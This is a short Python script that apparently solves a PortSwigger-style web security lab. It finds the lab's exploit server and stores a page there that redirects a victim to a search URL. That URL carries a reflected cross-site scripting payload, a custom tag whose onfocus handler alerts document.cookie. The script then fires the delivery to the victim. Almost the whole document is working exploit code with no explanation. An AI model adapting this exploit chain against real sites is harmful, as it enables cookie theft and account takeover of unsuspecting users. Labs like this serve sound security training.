import requests
import re
import sys

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]

burp_headers = {}
requests.get(burp_url, headers=burp_headers)
response = requests.get(burp_url, headers=burp_headers)
match = re.search(r"<a id='exploit-link' class='button' target='_blank' href='(https://exploit-[0-9a-f]+\.exploit-server\.net)'>", response.text)
exploit_server = match.group(1)
post_data = {
            'urlIsHttps': 'on',
            'responseFile': '/exploit',
            'responseHead': 'HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8',
            'responseBody': f'<script> location = \'{burp_url}/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x\'; </script>',
            'formAction': 'STORE'
            }
post_response = requests.post(exploit_server, data=post_data, headers=burp_headers)

last_step = exploit_server + "/deliver-to-victim"
burp0_headers = {}
final_response = requests.get(last_step, headers=burp0_headers)
